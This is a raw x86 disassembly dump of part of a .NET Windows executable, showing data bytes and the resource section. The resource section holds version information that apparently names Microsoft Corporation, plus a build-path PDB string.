  40564f:	gs cmp DWORD PTR fs:0x35633436,esi
  405657:	cmp    BYTE PTR [ecx+edi*1+0x33],ah
  40565b:	fs aaa 
  40565d:	xor    DWORD PTR [ebx],esi
  40565f:	arpl   WORD PTR [eax+esi*1+0x31],sp
  405663:	aaa    
  405664:	xor    ah,BYTE PTR [ebx+0x38]
  405667:	xor    dh,BYTE PTR gs:[ebx]
  40566a:	popa   
  40566b:	xor    DWORD PTR [eax],esi
  40566d:	data16 xor BYTE PTR [edx],dh
  405670:	xor    edi,DWORD PTR [ecx]
  405672:	bound  edi,QWORD PTR [eax]
  405674:	xor    BYTE PTR [ebx+0x39],ah
  405677:	bound  esi,QWORD PTR ss:[eax]
  40567a:	aaa    
  40567b:	aaa    
  40567c:	xor    esi,DWORD PTR [esi]
  40567e:	xor    ax,0x3864
  405682:	bound  esi,QWORD PTR [eax]
  405684:	xor    dh,BYTE PTR [edx]
  405686:	xor    eax,0x34613234
  40568b:	gs aaa 
  40568d:	xor    al,0x32
  40568f:	xor    eax,0x66356131
  405694:	xor    al,0x33
  405696:	xor    bh,BYTE PTR [eax]
  405698:	xor    dh,BYTE PTR [ebx+esi*1]
  40569b:	xor    DWORD PTR [eax],edi
  40569d:	bound  esi,QWORD PTR [ebx]
  40569f:	xor    eax,0x35613933
  4056a4:	popa   
  4056a5:	xor    BYTE PTR [eax],bh
  4056a7:	aaa    
  4056a8:	data16 cmp BYTE PTR [ebp+0x35],ah
  4056ac:	xor    esp,DWORD PTR [edx+esi*1+0x66]
  4056b0:	xor    DWORD PTR [ebx],esi
  4056b2:	xor    eax,0x61633966
  4056b7:	xor    al,0x37
  4056b9:	xor    sp,WORD PTR [edx+0x62]
  4056bd:	xor    ah,BYTE PTR [ebp+0x31]
  4056c0:	xor    BYTE PTR [ecx+0x66],ah
  4056c3:	data16 xor BYTE PTR [ecx+0x66],ah
  4056c7:	xor    BYTE PTR [eax],bh
  4056c9:	xor    al,0x39
  4056cb:	xor    eax,0x62663430
  4056d0:	aaa    
  4056d1:	arpl   WORD PTR [ebp+0x61],sp
  4056d4:	xor    esp,DWORD PTR [esi+0x66]
  4056d7:	xor    DWORD PTR [ecx],edi
  4056d9:	xor    ah,BYTE PTR [ebx+eiz*2+0x38]
  4056dd:	fs xor BYTE PTR gs:[ebp+0x64],ah
  4056e2:	popa   
  4056e3:	fs ss xor al,0x63
  4056e7:	cmp    BYTE PTR ss:[ebp+0x66],ah
  4056eb:	fs xor esi,DWORD PTR gs:[ebx+eiz*2]
  4056f0:	xor    eax,0x30336436
  4056f5:	xor    ah,BYTE PTR [ecx+0x64]
  4056f8:	xor    eax,0x36646635
  4056fd:	cmp    BYTE PTR gs:[eax],dh
  405700:	xor    si,WORD PTR [eax]
  405703:	xor    ah,BYTE PTR [ebp+esi*1+0x65]
  405707:	data16 arpl WORD PTR [ebp+eiz*2+0x61],sp
  40570c:	cmp    DWORD PTR gs:0x38353633,esi
  405713:	xor    esi,DWORD PTR fs:[esi*1+0x31363532]
  40571b:	bound  esi,QWORD PTR ds:0x63363366
  405721:	xor    eax,0x66653234
  405726:	bound  esp,QWORD PTR fs:[esp+eiz*2+0x39]
  40572b:	data16 cmp BYTE PTR [eax],bh
  40572e:	cmp    BYTE PTR ds:0x33643833,dh
  405734:	aaa    
  405735:	xor    al,0x63
  405737:	xor    WORD PTR gs:[eax],si
  40573b:	ss popa 
  40573d:	arpl   WORD PTR [esi+0x37],sp
  405740:	cmp    DWORD PTR fs:[ebx],esi
  405743:	popa   
  405744:	xor    al,0x34
  405746:	xor    al,0x35
  405748:	arpl   WORD PTR [ebx],si
  40574a:	arpl   WORD PTR [edi],si
  40574c:	xor    esp,DWORD PTR [ebx+0x64]
  40574f:	cmp    DWORD PTR [ecx],esi
  405751:	xor    DWORD PTR [esi+0x30],esp
  405754:	xor    eax,0x61613137
  405759:	xor    sp,WORD PTR [ebp+esi*1+0x34]
  40575e:	fs popa 
  405760:	xor    DWORD PTR [edx],esi
  405762:	bound  esi,QWORD PTR [ecx]
  405764:	xor    DWORD PTR [esp+eiz*2+0x65],esp
  405768:	arpl   WORD PTR [ebx],si
  40576a:	aaa    
  40576b:	xor    eax,0x813362
  405770:	popa   
  405771:	xor    eax,0x36363861
  405776:	xor    DWORD PTR gs:[ebp+0x65],esp
  40577a:	xor    DWORD PTR [eax],edi
  40577c:	data16 cmp BYTE PTR ss:[eax],dh
  405780:	aaa    
  405781:	ss cmp BYTE PTR ss:[edx],dh
  405785:	xor    BYTE PTR [ecx],bh
  405787:	xor    sp,WORD PTR [edx+0x31]
  40578b:	xor    DWORD PTR [edx],esi
  40578d:	xor    esi,DWORD PTR [esi]
  40578f:	popa   
  405790:	arpl   WORD PTR [ebp+0x35],sp
  405793:	xor    dh,BYTE PTR gs:[ecx]
  405796:	xor    WORD PTR [ecx],si
  405799:	aaa    
  40579a:	cmp    BYTE PTR [eax],dh
  40579c:	xor    esp,DWORD PTR [ecx+0x33]
  40579f:	xor    DWORD PTR [ebx+esi*1],esi
  4057a2:	popa   
  4057a3:	bound  esp,QWORD PTR [edx+0x31]
  4057a6:	xor    dh,BYTE PTR [esi]
  4057a8:	fs xor BYTE PTR fs:[ebx],dh
  4057ac:	xor    eax,0x32643764
  4057b1:	data16 cmp BYTE PTR [edi],dh
  4057b4:	bound  esi,QWORD PTR ss:[esi]
  4057b7:	cmp    DWORD PTR [ebx],esi
  4057b9:	cmp    BYTE PTR [ecx+0x61],ah
  4057bc:	data16 xor ah,BYTE PTR [ebp+0x65]
  4057c0:	xor    esi,DWORD PTR [ecx+esi*1]
  4057c3:	xor    al,0x64
  4057c5:	xor    eax,0x64303234
  4057ca:	aaa    
  4057cb:	xor    eax,0x31323633
  4057d0:	xor    al,0x30
  4057d2:	xor    BYTE PTR [edx+eiz*2+0x34],ah
  4057d6:	xor    al,0x61
  4057d8:	xor    al,0x39
  4057da:	arpl   WORD PTR [eax+edi*1],si
  4057dd:	arpl   WORD PTR ss:[ebp+0x31],sp
  4057e1:	xor    esi,DWORD PTR [ebx+esi*1]
  4057e4:	xor    BYTE PTR [eax],dh
  4057e6:	popa   
  4057e7:	xor    dh,BYTE PTR [ecx]
  4057e9:	xor    BYTE PTR [esi],dh
  4057eb:	popa   
  4057ec:	bound  esi,QWORD PTR fs:[esi]
  4057ef:	bound  esp,QWORD PTR [edx+eiz*2+0x34]
  4057f3:	xor    esi,DWORD PTR [ebx]
  4057f5:	xor    eax,0x65663039
  4057fa:	data16 cmp BYTE PTR [ecx+0x64],ah
  4057fe:	xor    eax,0x63333463
  405803:	bound  esp,QWORD PTR [ecx+0x38]
  405806:	xor    dh,BYTE PTR [edx]
  405808:	cmp    DWORD PTR [eax],esi
  40580a:	arpl   WORD PTR fs:[ecx+edi*1],si
  40580e:	xor    eax,0x66653033
  405813:	data16 cmp BYTE PTR fs:[esi],dh
  405817:	xor    eax,0x39643332
  40581c:	xor    al,0x38
  40581e:	xor    esp,DWORD PTR [ebx+0x30]
  405821:	xor    BYTE PTR [esi+0x34],ah
  405824:	xor    eax,0x34666138
  405829:	cmp    BYTE PTR ss:[ecx],bh
  40582c:	xor    BYTE PTR [eax],dh
  40582e:	xor    esi,DWORD PTR [esi]
  405830:	bound  esi,QWORD PTR [eax]
  405832:	xor    ah,BYTE PTR gs:[ebx+0x36]
  405836:	xor    DWORD PTR [eax+esi*1+0x37],esp
  40583a:	aaa    
  40583b:	fs aaa 
  40583d:	bound  sp,DWORD PTR [ecx+0x63]
  405841:	xor    al,0x36
  405843:	aaa    
  405844:	popa   
  405845:	xor    eax,0x62653630
  40584a:	popa   
  40584b:	xor    bh,BYTE PTR [ecx]
  40584d:	gs xor al,0x36
  405850:	aaa    
  405851:	popa   
  405852:	cmp    BYTE PTR [edi],dh
  405854:	xor    DWORD PTR [ecx],edi
  405856:	cmp    BYTE PTR [edx+0x30],ah
  405859:	xor    eax,0x34376333
  40585e:	cmp    DWORD PTR [ecx+0x61],esp
  405861:	xor    ah,BYTE PTR [ecx+0x34]
  405864:	xor    bh,BYTE PTR fs:[eax]
  405867:	xor    al,0x30
  405869:	arpl   WORD PTR [edi],si
  40586b:	cmp    BYTE PTR [eiz*2+0x6436],dh
  405872:	push   ds
  405873:	add    DWORD PTR [eax],eax
  405875:	add    DWORD PTR [eax],eax
  405877:	push   esp
  405878:	add    dl,BYTE PTR [esi]
  40587a:	push   edi
  40587b:	jb     0x4058de
  40587d:	jo     0x4058cd
  40587f:	outs   dx,DWORD PTR ds:[esi]
  405880:	outs   dx,BYTE PTR ds:[esi]
  405881:	inc    ebp
  405882:	js     0x4058e7
  405884:	gs jo  0x4058fb
  405887:	imul   ebp,DWORD PTR [edi+0x6e],0x6f726854
  40588e:	ja     0x405903
  405890:	add    DWORD PTR [eax],ecx
  405892:	add    DWORD PTR [eax],eax
  405894:	add    al,BYTE PTR [eax]
  405896:	add    BYTE PTR [eax],al
  405898:	add    BYTE PTR [eax],al
  40589a:	or     BYTE PTR [ecx],al
  40589c:	add    BYTE PTR [eax],cl
	...
  4058a6:	add    BYTE PTR [eax],al
  4058a8:	retf   
  4058a9:	fist   WORD PTR [ecx]
  4058ab:	push   eax
  4058ac:	add    BYTE PTR [eax],al
  4058ae:	add    BYTE PTR [eax],al
  4058b0:	add    al,BYTE PTR [eax]
  4058b2:	add    BYTE PTR [eax],al
  4058b4:	sbb    al,0x1
  4058b6:	add    BYTE PTR [eax],al
  4058b8:	rcr    BYTE PTR [eax+0x0],0x0
  4058bc:	sar    BYTE PTR [edx],0x0
  4058bf:	add    BYTE PTR [edx+0x53],dl
  4058c2:	inc    esp
  4058c3:	push   ebx
  4058c4:	or     DWORD PTR [edi+edi*8+0x29a7b92],edi
  4058cb:	dec    ebp
  4058cc:	cwde   
  4058cd:	cli    
  4058ce:	popf   
  4058cf:	pop    eax
  4058d0:	push   0x11c6f27
  4058d5:	add    BYTE PTR [eax],al
  4058d7:	add    BYTE PTR [esi+0x3a],ah
  4058da:	pop    esp
  4058db:	bound  ebp,QWORD PTR [ecx+0x6e]
  4058de:	popa   
  4058df:	jb     0x40594a
  4058e1:	gs jae 0x405940
  4058e4:	dec    ecx
  4058e5:	outs   dx,BYTE PTR ds:[esi]
  4058e6:	je     0x40594d
  4058e8:	jb     0x405957
  4058ea:	gs imul esp,DWORD PTR fs:[ecx+0x74],0x73765c65
  4058f3:	gs je  0x405952
  4058f6:	ins    DWORD PTR es:[edi],dx
  4058f7:	jae    0x40596d
  4058f9:	gs jae 0x405970
  4058fc:	gs js  0x405964
  4058ff:	arpl   WORD PTR [ebp+0x74],si
  405902:	outs   dx,DWORD PTR ds:[esi]
  405903:	jb     0x405933
  405905:	popa   
  405906:	jo     0x405978
  405908:	arpl   WORD PTR [edi+0x6e],bp
  40590b:	je     0x40596e
  40590d:	imul   ebp,DWORD PTR [esi+0x65],0x73632e72
  405914:	jo     0x405988
  405916:	outs   dx,DWORD PTR ds:[esi]
  405917:	push   0x5f
  405919:	pop    edi
  40591a:	xor    DWORD PTR [edi+esi*1],esi
  40591d:	ss aaa 
  40591f:	aaa    
  405920:	xor    eax,0x5c393436
  405925:	outs   dx,DWORD PTR ds:[esi]
  405926:	bound  ebp,QWORD PTR [edx+0x72]
  405929:	pop    esp
  40592a:	js     0x405964
  40592c:	ss pop esp
  40592e:	jbe    0x4059a3
  405930:	je     0x405997
  405932:	jae    0x4059a8
  405934:	cs gs js 0x40599d
  405938:	arpl   WORD PTR [ebp+0x74],si
  40593b:	imul   ebp,DWORD PTR [edi+0x6e],0x69676e65
  405942:	outs   dx,BYTE PTR ds:[esi]
  405943:	gs cs popa 
  405946:	jo     0x4059b8
  405948:	arpl   WORD PTR [edi+0x6e],bp
  40594b:	je     0x4059ae
  40594d:	imul   ebp,DWORD PTR [esi+0x65],0x64702e72
  405954:	bound  eax,QWORD PTR [eax]
	...
  4059da:	add    BYTE PTR [eax],al
  4059dc:	add    al,0x5a
	...
  4059e6:	add    BYTE PTR [eax],al
  4059e8:	push   ds
  4059e9:	pop    edx
  4059ea:	add    BYTE PTR [eax],al
  4059ec:	add    BYTE PTR [eax],ah
	...
  405a02:	add    BYTE PTR [eax],al
  405a04:	adc    BYTE PTR [edx+0x0],bl
	...
  405a0f:	add    BYTE PTR [eax],al
  405a11:	add    BYTE PTR [edi+0x43],bl
  405a14:	outs   dx,DWORD PTR ds:[esi]
  405a15:	jb     0x405a5c
  405a17:	js     0x405a7e
  405a19:	dec    ebp
  405a1a:	popa   
  405a1b:	imul   ebp,DWORD PTR [esi+0x0],0x6f63736d
  405a22:	jb     0x405a89
  405a24:	gs cs fs ins BYTE PTR es:[edi],dx
  405a28:	ins    BYTE PTR es:[edi],dx
  405a29:	add    BYTE PTR [eax],al
  405a2b:	add    BYTE PTR [eax],al
  405a2d:	add    bh,bh
  405a2f:	and    eax,0x402000

Disassembly of section .rsrc:

00406000 <.rsrc>:
	...
  40600c:	add    BYTE PTR [eax],al
  40600e:	add    al,BYTE PTR [eax]
  406010:	adc    BYTE PTR [eax],al
  406012:	add    BYTE PTR [eax],al
  406014:	and    BYTE PTR [eax],al
  406016:	add    BYTE PTR [eax+0x18],al
  40601c:	cmp    BYTE PTR [eax],al
  40601e:	add    BYTE PTR [eax+0x0],al
	...
  40602c:	add    BYTE PTR [eax],al
  40602e:	add    DWORD PTR [eax],eax
  406030:	add    DWORD PTR [eax],eax
  406032:	add    BYTE PTR [eax],al
  406034:	push   eax
  406035:	add    BYTE PTR [eax],al
  406037:	add    BYTE PTR [eax],0x0
	...
  406046:	add    DWORD PTR [eax],eax
  406048:	add    DWORD PTR [eax],eax
  40604a:	add    BYTE PTR [eax],al
  40604c:	push   0x800000
	...
  40605d:	add    BYTE PTR [ecx],al
  40605f:	add    BYTE PTR [eax],al
  406061:	add    BYTE PTR [eax],al
  406063:	add    BYTE PTR [eax+0x0],al
	...
  406075:	add    BYTE PTR [ecx],al
  406077:	add    BYTE PTR [eax],al
  406079:	add    BYTE PTR [eax],al
  40607b:	add    BYTE PTR [eax-0x60000000],dl
  406081:	pusha  
  406082:	add    BYTE PTR [eax],al
  406084:	mov    BYTE PTR [eax+eax*1],al
	...
  40608f:	add    BYTE PTR [eax],ch
  406091:	add    BYTE PTR gs:[eax],al
  406094:	jmp    0x0:0x1
  40609b:	add    BYTE PTR [eax],al
  40609d:	add    BYTE PTR [eax],al
  40609f:	add    BYTE PTR [eax+0x3404],cl
  4060a5:	add    BYTE PTR [esi+0x0],dl
  4060a8:	push   ebx
  4060a9:	add    BYTE PTR [edi+0x0],bl
  4060ac:	push   esi
  4060ad:	add    BYTE PTR [ebp+0x0],al
  4060b0:	push   edx
  4060b1:	add    BYTE PTR [ebx+0x0],dl
  4060b4:	dec    ecx
  4060b5:	add    BYTE PTR [edi+0x0],cl
  4060b8:	dec    esi
  4060b9:	add    BYTE PTR [edi+0x0],bl
  4060bc:	dec    ecx
  4060bd:	add    BYTE PTR [esi+0x0],cl
  4060c0:	inc    esi
  4060c1:	add    BYTE PTR [edi+0x0],cl
  4060c4:	add    BYTE PTR [eax],al
  4060c6:	add    BYTE PTR [eax],al
  4060c8:	mov    ebp,0xfeef04
  4060cd:	add    BYTE PTR [ecx],al
  4060cf:	add    BYTE PTR [eax],al
  4060d1:	add    BYTE PTR [ebx],cl
  4060d3:	add    BYTE PTR [ecx],al
  4060d5:	add    BYTE PTR [edi],ah
  4060d7:	mov    BYTE PTR [eax],0x0
  4060da:	or     eax,DWORD PTR [eax]
  4060dc:	add    DWORD PTR [eax],eax
  4060de:	daa    
  4060df:	(bad)  
  4060e0:	aas    
  4060e1:	add    BYTE PTR [eax],al
  4060e3:	add    BYTE PTR [eax],al
  4060e5:	add    BYTE PTR [eax],al
  4060e7:	add    BYTE PTR [eax+eax*1],al
  4060ea:	add    BYTE PTR [eax],al
  4060ec:	add    DWORD PTR [eax],eax
	...
  4060fa:	add    BYTE PTR [eax],al
  4060fc:	inc    esp
  4060fd:	add    BYTE PTR [eax],al
  4060ff:	add    BYTE PTR [ecx],al
  406101:	add    BYTE PTR [esi+0x0],dl
  406104:	popa   
  406105:	add    BYTE PTR [edx+0x0],dh
  406108:	inc    esi
  406109:	add    BYTE PTR [ecx+0x0],ch
  40610c:	ins    BYTE PTR es:[edi],dx
  40610d:	add    BYTE PTR [ebp+0x0],ah
  406110:	dec    ecx
  406111:	add    BYTE PTR [esi+0x0],ch
  406114:	data16 add BYTE PTR [edi+0x0],ch
  406118:	add    BYTE PTR [eax],al
  40611a:	add    BYTE PTR [eax],al
  40611c:	and    al,0x0
  40611e:	add    al,0x0
  406120:	add    BYTE PTR [eax],al
  406122:	push   esp
  406123:	add    BYTE PTR [edx+0x0],dh
  406126:	popa   
  406127:	add    BYTE PTR [esi+0x0],ch
  40612a:	jae    0x40612c
  40612c:	ins    BYTE PTR es:[edi],dx
  40612d:	add    BYTE PTR [ecx+0x0],ah
  406130:	je     0x406132
  406132:	imul   eax,DWORD PTR [eax],0x6e006f
  406138:	add    BYTE PTR [eax],al
  40613a:	add    BYTE PTR [eax],al
  40613c:	add    BYTE PTR [eax],al
  40613e:	mov    al,0x4
  406140:	call   0x1406148
  406145:	add    BYTE PTR [ebx+0x0],dl
  406148:	je     0x40614a
  40614a:	jb     0x40614c
  40614c:	imul   eax,DWORD PTR [eax],0x67006e
  406152:	inc    esi
  406153:	add    BYTE PTR [ecx+0x0],ch
  406156:	ins    BYTE PTR es:[edi],dx
  406157:	add    BYTE PTR [ebp+0x0],ah
  40615a:	dec    ecx
  40615b:	add    BYTE PTR [esi+0x0],ch
  40615e:	data16 add BYTE PTR [edi+0x0],ch
  406162:	add    BYTE PTR [eax],al
  406164:	les    eax,FWORD PTR [ebx]
  406166:	add    BYTE PTR [eax],al
  406168:	add    DWORD PTR [eax],eax
  40616a:	xor    BYTE PTR [eax],al
  40616c:	xor    BYTE PTR [eax],al
  40616e:	xor    BYTE PTR [eax],al
  406170:	xor    BYTE PTR [eax],al
  406172:	xor    BYTE PTR [eax],al
  406174:	xor    al,0x0
  406176:	bound  eax,QWORD PTR [eax]
  406178:	xor    BYTE PTR [eax],al
  40617a:	add    BYTE PTR [eax],al
  40617c:	push   0x1002800
  406181:	add    BYTE PTR [ebx+0x0],al
  406184:	outs   dx,DWORD PTR ds:[esi]
  406185:	add    BYTE PTR [ebp+0x0],ch
  406188:	ins    DWORD PTR es:[edi],dx
  406189:	add    BYTE PTR [ebp+0x0],ah
  40618c:	outs   dx,BYTE PTR ds:[esi]
  40618d:	add    BYTE PTR [eax+eax*1+0x73],dh
  406191:	add    BYTE PTR [eax],al
  406193:	add    BYTE PTR [esi+0x0],dh
  406196:	jae    0x406198
  406198:	je     0x40619a
  40619a:	add    BYTE PTR gs:[ebx+0x0],dh
  40619e:	je     0x4061a0
  4061a0:	add    BYTE PTR cs:[ebp+0x0],ah
  4061a4:	js     0x4061a6
  4061a6:	add    BYTE PTR gs:[ebx+0x0],ah
  4061aa:	jne    0x4061ac
  4061ac:	je     0x4061ae
  4061ae:	imul   eax,DWORD PTR [eax],0x6e006f
  4061b4:	add    BYTE PTR gs:[esi+0x0],ch
  4061b8:	add    BYTE PTR [bx+di+0x0],ch
  4061bc:	outs   dx,BYTE PTR ds:[esi]
  4061bd:	add    BYTE PTR [ebp+0x0],ah
  4061c0:	add    BYTE PTR cs:[ecx+0x0],ah
  4061c4:	jo     0x4061c6
  4061c6:	jo     0x4061c8
  4061c8:	arpl   WORD PTR [eax],ax
  4061ca:	outs   dx,DWORD PTR ds:[esi]
  4061cb:	add    BYTE PTR [esi+0x0],ch
  4061ce:	je     0x4061d0
  4061d0:	popa   
  4061d1:	add    BYTE PTR [ecx+0x0],ch
  4061d4:	outs   dx,BYTE PTR ds:[esi]
  4061d5:	add    BYTE PTR [ebp+0x0],ah
  4061d8:	jb     0x4061da
  4061da:	add    BYTE PTR cs:[ebp+0x0],ah
  4061de:	js     0x4061e0
  4061e0:	add    BYTE PTR gs:[eax],al
  4061e3:	add    BYTE PTR [eax+eax*1+0x16],cl
  4061e7:	add    BYTE PTR [ecx],al
  4061e9:	add    BYTE PTR [ebx+0x0],al
  4061ec:	outs   dx,DWORD PTR ds:[esi]
  4061ed:	add    BYTE PTR [ebp+0x0],ch
  4061f0:	jo     0x4061f2
  4061f2:	popa   
  4061f3:	add    BYTE PTR [esi+0x0],ch
  4061f6:	jns    0x4061f8
  4061f8:	dec    esi
  4061f9:	add    BYTE PTR [ecx+0x0],ah
  4061fc:	ins    DWORD PTR es:[edi],dx
  4061fd:	add    BYTE PTR [ebp+0x0],ah
  406200:	add    BYTE PTR [eax],al
  406202:	add    BYTE PTR [eax],al
  406204:	dec    ebp
  406205:	add    BYTE PTR [ecx+0x0],ch
  406208:	arpl   WORD PTR [eax],ax
  40620a:	jb     0x40620c
  40620c:	outs   dx,DWORD PTR ds:[esi]
  40620d:	add    BYTE PTR [ebx+0x0],dh
  406210:	outs   dx,DWORD PTR ds:[esi]
  406211:	add    BYTE PTR [esi+0x0],ah
  406214:	je     0x406216
  406216:	and    BYTE PTR [eax],al
  406218:	inc    ebx
  406219:	add    BYTE PTR [edi+0x0],ch
  40621c:	jb     0x40621e
  40621e:	jo     0x406220
  406220:	outs   dx,DWORD PTR ds:[esi]
  406221:	add    BYTE PTR [edx+0x0],dh
  406224:	popa   
  406225:	add    BYTE PTR [eax+eax*1+0x69],dh
  406229:	add    BYTE PTR [edi+0x0],ch
  40622c:	outs   dx,BYTE PTR ds:[esi]
  40622d:	add    BYTE PTR [eax],al
  40622f:	add    BYTE PTR [eax+0x0],bh
  406232:	sub    BYTE PTR [eax],al
  406234:	add    DWORD PTR [eax],eax
  406236:	inc    esi
  406237:	add    BYTE PTR [ecx+0x0],ch
  40623a:	ins    BYTE PTR es:[edi],dx
  40623b:	add    BYTE PTR [ebp+0x0],ah
  40623e:	inc    esp
  40623f:	add    BYTE PTR [ebp+0x0],ah
  406242:	jae    0x406244
  406244:	arpl   WORD PTR [eax],ax
  406246:	jb     0x406248
  406248:	imul   eax,DWORD PTR [eax],0x740070
  40624e:	imul   eax,DWORD PTR [eax],0x6e006f
  406254:	add    BYTE PTR [eax],al
  406256:	add    BYTE PTR [eax],al
  406258:	jbe    0x40625a
  40625a:	jae    0x40625c
  40625c:	je     0x40625e
  40625e:	add    BYTE PTR gs:[ebx+0x0],dh
  406262:	je     0x406264
  406264:	add    BYTE PTR cs:[ebp+0x0],ah
  406268:	js     0x40626a
  40626a:	add    BYTE PTR gs:[ebx+0x0],ah
  40626e:	jne    0x406270
  406270:	je     0x406272
  406272:	imul   eax,DWORD PTR [eax],0x6e006f
  406278:	add    BYTE PTR gs:[esi+0x0],ch
  40627c:	add    BYTE PTR [bx+di+0x0],ch
  406280:	outs   dx,BYTE PTR ds:[esi]
  406281:	add    BYTE PTR [ebp+0x0],ah
  406284:	add    BYTE PTR cs:[ecx+0x0],ah
  406288:	jo     0x40628a
  40628a:	jo     0x40628c
  40628c:	arpl   WORD PTR [eax],ax
  40628e:	outs   dx,DWORD PTR ds:[esi]
  40628f:	add    BYTE PTR [esi+0x0],ch
  406292:	je     0x406294
  406294:	popa   
  406295:	add    BYTE PTR [ecx+0x0],ch
  406298:	outs   dx,BYTE PTR ds:[esi]
  406299:	add    BYTE PTR [ebp+0x0],ah
  40629c:	jb     0x40629e
  40629e:	add    BYTE PTR cs:[ebp+0x0],ah
  4062a2:	js     0x4062a4
  4062a4:	add    BYTE PTR gs:[eax],al
  4062a7:	add    BYTE PTR [eax+eax*1],bh
  4062aa:	or     eax,0x46000100
  4062af:	add    BYTE PTR [ecx+0x0],ch
  4062b2:	ins    BYTE PTR es:[edi],dx
  4062b3:	add    BYTE PTR [ebp+0x0],ah
  4062b6:	push   esi
  4062b7:	add    BYTE PTR [ebp+0x0],ah
  4062ba:	jb     0x4062bc
  4062bc:	jae    0x4062be
  4062be:	imul   eax,DWORD PTR [eax],0x6e006f
  4062c4:	add    BYTE PTR [eax],al
  4062c6:	add    BYTE PTR [eax],al
  4062c8:	xor    DWORD PTR [eax],eax
  4062ca:	xor    DWORD PTR [eax],eax
  4062cc:	add    BYTE PTR cs:[eax],dh
  4062cf:	add    BYTE PTR [esi],ch
  4062d1:	add    BYTE PTR ds:0x37003000,dh
  4062d7:	add    BYTE PTR [edx],dh
  4062d9:	add    BYTE PTR [edi],dh
  4062db:	add    BYTE PTR [esi],ch
  4062dd:	add    BYTE PTR [ecx],dh
  4062df:	add    BYTE PTR [eax],al
  4062e1:	add    BYTE PTR [eax],al
  4062e3:	add    BYTE PTR [eax+0x0],dh
  4062e6:	sub    BYTE PTR [eax],al
  4062e8:	add    DWORD PTR [eax],eax
  4062ea:	dec    ecx
  4062eb:	add    BYTE PTR [esi+0x0],ch
  4062ee:	je     0x4062f0
  4062f0:	add    BYTE PTR gs:[edx+0x0],dh
  4062f4:	outs   dx,BYTE PTR ds:[esi]
  4062f5:	add    BYTE PTR [ecx+0x0],ah
  4062f8:	ins    BYTE PTR es:[edi],dx
  4062f9:	add    BYTE PTR [esi+0x0],cl
  4062fc:	popa   
  4062fd:	add    BYTE PTR [ebp+0x0],ch
  406300:	add    BYTE PTR gs:[eax],al
  406303:	add    BYTE PTR [esi+0x0],dh
  406306:	jae    0x406308
  406308:	je     0x40630a
  40630a:	add    BYTE PTR gs:[ebx+0x0],dh
  40630e:	je     0x406310
  406310:	add    BYTE PTR cs:[ebp+0x0],ah
  406314:	js     0x406316
  406316:	add    BYTE PTR gs:[ebx+0x0],ah
  40631a:	jne    0x40631c
  40631c:	je     0x40631e
  40631e:	imul   eax,DWORD PTR [eax],0x6e006f
  406324:	add    BYTE PTR gs:[esi+0x0],ch
  406328:	add    BYTE PTR [bx+di+0x0],ch
  40632c:	outs   dx,BYTE PTR ds:[esi]
  40632d:	add    BYTE PTR [ebp+0x0],ah
  406330:	add    BYTE PTR cs:[ecx+0x0],ah
  406334:	jo     0x406336
  406336:	jo     0x406338
  406338:	arpl   WORD PTR [eax],ax
  40633a:	outs   dx,DWORD PTR ds:[esi]
  40633b:	add    BYTE PTR [esi+0x0],ch
  40633e:	je     0x406340
  406340:	popa   
  406341:	add    BYTE PTR [ecx+0x0],ch
  406344:	outs   dx,BYTE PTR ds:[esi]
  406345:	add    BYTE PTR [ebp+0x0],ah
  406348:	jb     0x40634a
  40634a:	add    BYTE PTR cs:[ebp+0x0],ah
  40634e:	js     0x406350
  406350:	add    BYTE PTR gs:[eax],al
  406353:	add    BYTE PTR [eax+0x1002e00],al
  406359:	add    BYTE PTR [eax+eax*1+0x65],cl
  40635d:	add    BYTE PTR [edi+0x0],ah
  406360:	popa   
  406361:	add    BYTE PTR [eax+eax*1+0x43],ch
  406365:	add    BYTE PTR [edi+0x0],ch
  406368:	jo     0x40636a
  40636a:	jns    0x40636c
  40636c:	jb     0x40636e
  40636e:	imul   eax,DWORD PTR [eax],0x680067
  406374:	je     0x406376
  406376:	add    BYTE PTR [eax],al
  406378:	test   eax,0x4d002000
  40637d:	add    BYTE PTR [ecx+0x0],ch
  406380:	arpl   WORD PTR [eax],ax
  406382:	jb     0x406384
  406384:	outs   dx,DWORD PTR ds:[esi]
  406385:	add    BYTE PTR [ebx+0x0],dh
  406388:	outs   dx,DWORD PTR ds:[esi]
  406389:	add    BYTE PTR [esi+0x0],ah
  40638c:	je     0x40638e
  40638e:	and    BYTE PTR [eax],al
  406390:	inc    ebx
  406391:	add    BYTE PTR [edi+0x0],ch
  406394:	jb     0x406396
  406396:	jo     0x406398
  406398:	outs   dx,DWORD PTR ds:[esi]
  406399:	add    BYTE PTR [edx+0x0],dh
  40639c:	popa   
  40639d:	add    BYTE PTR [eax+eax*1+0x69],dh
  4063a1:	add    BYTE PTR [edi+0x0],ch
  4063a4:	outs   dx,BYTE PTR ds:[esi]
  4063a5:	add    BYTE PTR [esi],ch
  4063a7:	add    BYTE PTR [eax],ah
  4063a9:	add    BYTE PTR [ecx+0x0],al
  4063ac:	ins    BYTE PTR es:[edi],dx
  4063ad:	add    BYTE PTR [eax+eax*1+0x20],ch
  4063b1:	add    BYTE PTR [edx+0x0],dh
  4063b4:	imul   eax,DWORD PTR [eax],0x680067
  4063ba:	je     0x4063bc
  4063bc:	jae    0x4063be
  4063be:	and    BYTE PTR [eax],al
  4063c0:	jb     0x4063c2
  4063c2:	add    BYTE PTR gs:[ebx+0x0],dh
  4063c6:	add    BYTE PTR gs:[edx+0x0],dh
  4063ca:	jbe    0x4063cc
  4063cc:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  4063d1:	add    BYTE PTR [eax],al
  4063d3:	add    BYTE PTR [eax+0x0],bh
  4063d6:	sub    BYTE PTR [eax],al
  4063d8:	add    DWORD PTR [eax],eax
  4063da:	dec    edi
  4063db:	add    BYTE PTR [edx+0x0],dh
  4063de:	imul   eax,DWORD PTR [eax],0x690067
  4063e4:	outs   dx,BYTE PTR ds:[esi]
  4063e5:	add    BYTE PTR [ecx+0x0],ah
  4063e8:	ins    BYTE PTR es:[edi],dx
  4063e9:	add    BYTE PTR [esi+0x0],al
  4063ec:	imul   eax,DWORD PTR [eax],0x65006c
  4063f2:	outs   dx,BYTE PTR ds:[esi]
  4063f3:	add    BYTE PTR [ecx+0x0],ah
  4063f6:	ins    DWORD PTR es:[edi],dx
  4063f7:	add    BYTE PTR [ebp+0x0],ah
  4063fa:	add    BYTE PTR [eax],al
  4063fc:	jbe    0x4063fe
  4063fe:	jae    0x406400
  406400:	je     0x406402
  406402:	add    BYTE PTR gs:[ebx+0x0],dh
  406406:	je     0x406408
  406408:	add    BYTE PTR cs:[ebp+0x0],ah
  40640c:	js     0x40640e
  40640e:	add    BYTE PTR gs:[ebx+0x0],ah
